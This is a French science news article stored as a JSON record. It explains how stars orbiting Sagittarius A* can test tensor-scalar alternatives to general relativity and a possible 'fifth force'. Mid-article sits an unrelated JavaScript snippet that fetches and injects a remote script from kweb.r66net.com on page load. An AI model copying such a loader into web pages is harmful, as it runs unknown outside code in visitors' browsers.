{"title": "Les astronomes chassent la cinquieme force autour de notre trou noir galactique", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2017-06-01", "content": "L'idee d'une cinquieme force decoule naturellement des travaux cherchant a prolonger la theorie de la relativite generale pour unifier la physique ou pour expliquer l'energie noire. Si elle existe, elle pourrait suffisamment modifier les mouvements des etoiles proches du trou noir supermassif de la Voie lactee pour etre bientot mise en evidence. Ce qu'il faut retenir Des generalisations des equations d'Einstein ont ete proposees, notamment pour unifier les forces connues. Souvent, elles conduisent a l'existence d'une sorte de cinquieme force. Ces alternatives aux equations d'Einstein dependent de parametres dont les effets sont peut-etre detectables dans les mouvements de corps se deplacant dans des champs de gravitation suffisamment forts. Les instruments actuels commencent a permettre de jouer a ce jeu avec les etoiles proches du trou noir supermassif de notre galaxie. La theorie de la  gravitation  d' Einstein  est desormais centenaire. La decouverte de l'expansion de l' Univers , des trous noirs et des  ondes gravitationnelles  en sont sans doute les consequences les plus spectaculaires et les plus emblematiques. Elle a aussi conduit au developpement des << approximations post-newtoniennes >>, c'est-a-dire la determination par le calcul des ecarts aux  equations  de  Newton  predits par les equations de la  relativite generale  lorsque l' espace-temps  est courbe mais pas trop, comme au voisinage des planetes et surtout des trous noirs. Ces travaux ont egalement servi de base a d'importantes recherches qui, si elles restent bien dans le cadre de theories de la gravitation basees sur l'espace-temps courbe d' Einstein , conduisent a adopter des equations differentes de celles d'Einstein. Toutes les approximations post-newtoniennes de ces theories peuvent etre parametrees et rassemblees sous une meme famille de theories. Des tests peuvent alors etre imagines pour departager les concurrentes. Cela peut se faire notamment en comparant aux observations les calculs de la deviation des rayons lumineux au voisinage des  astres  et aussi en etudiant  les  pulsars  binaires emettant des  ondes gravitationnelles . Le physicien Clifford Will est un des grands maitres de ce domaine et son article passant en revue les differents tests observationnels de la relativite generale, que l'on peut trouver sur le site de  Living reviews in relativity , est un grand classique. Une video sur les observations des etoiles autour du trou noir supermassif de la Voie lactee avec le VLT. De vraies images sont melangees a des images de synthese. (c) ESO Au-dela des approximations post-newtoniennes de la relativite generale Parmi les alternatives a la gravitation d'Einstein, les theories dites  tenseur-scalaire   emergent  par exemple de la  theorie des supercordes  avec un << dilaton >>, mais aussi des theories de Kaluza-Klein proposees pour unifier la  physique  des forces. Tout se passe alors en quelque sorte comme s'il existait une cinquieme force dans l'univers observable. Elle est d'ailleurs un serpent de mer de la physique theorique. Plusieurs fois, elle a semble pointer le bout de son  nez  dans des resultats d'experiences anormaux avant de disparaitre a la grande frustration des physiciens.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Depuis des decennies, on cherche donc, a defaut de les mettre en evidence, a poser des contraintes sur les parametres des theories tenseur-scalaire. Les pistes suivies sont, comme on l'a deja dit, dans le domaine de l'astronomie, d'abord avec les  mouvements  des planetes du  Systeme solaire  puis avec des astres tres massifs, comme les couples d' etoiles a neutrons  constituant les pulsars binaires. Or, dans un article depose sur  arXiv , une equipe internationale de chercheurs vient de proposer une nouvelle  fenetre  pour tester une nouvelle region de l'espace des parametres de certaines des  alternatives a la  relativite generale . Il s'agit encore une fois de tester les equations du champ de gravitation lorsqu'il est fort et que les deviations aux predictions des approximations post-newtoniennes de la relativite generale sont notables. En l'occurrence, l'idee de ces chercheurs est de tester ces approximations dans les mouvements d' etoiles  autour d'un  trou noir supermassif . Mais pas n'importe lequel : le plus proche de nous, a savoir celui de la  Voie lactee , connu sous le nom de Sagittarius A*. Les orbites de deux etoiles etudiees par les chercheurs de 1995 a 2016 autour de Sagittarius A*. (c)  UCLA Galactic Center Group                               Une cinquieme force trahie par la mecanique celeste avec Sagittarius A* ? Or, les mouvements de ces etoiles sont etudies depuis longtemps et notamment par la laureate d'un  prix Crafoord , l'astrophysicienne Andrea Ghez, l'actuelle directrice de l' UCLA Galactic Center Group . Depuis presque vingt ans, ils sont consignes dans une  base de donnees  constituee grace aux instruments de l' observatoire Keck , dotes d'optique adaptative. Les positions et les  vitesses  de plusieurs milliers d'etoiles au voisinage du centre de notre  Galaxie  ont ete determinees, ce qui a permis d'estimer la  masse  du trou noir supermassif central, ainsi que son rayon (4 millions de masses solaires et 11 millions de kilometres). Quelques-unes de ces etoiles se distinguent, comme S0-2, qui a une  periode orbitale  de 15,5 ans, S0-102 avec 11,5 ans et S0-38 avec 19,2 ans. A son  periastre , S0-2 n'est qu'a 17 heures-lumiere de Sagittarius A*, soit seulement quatre fois la distance Neptune-Soleil. Les donnees des  orbites  de S0-2 et S0-38 se sont revelees precieuses car elles permettent deja de poser des contraintes sur une classe de modeles de cinquieme force, qui consiste en gros a ajouter a une force de type newtonienne un terme se comportant comme la force de Yukawa entre les  nucleons . En 2018, S0-2 passera au plus pres de Sagittarius A* et l'effet d'une eventuelle cinquieme force sera plus important, avec un peu (beaucoup ?) de chance, la physique pourrait en etre changee. Interview : un trou noir pourrait-il entrer en collision avec la Terre ?                       Un trou noir est une region de l'espace dont rien ne peut s'echapper, pas meme la lumiere. Il est donc naturel de se demander si ce type d'objet pourrait etre une menace pour notre planete. Futura-Sciences a interviewe Jean-Pierre Luminet, astrophysicien de renom, qui nous repond ici en video.                                       ", "theme": "sciences"}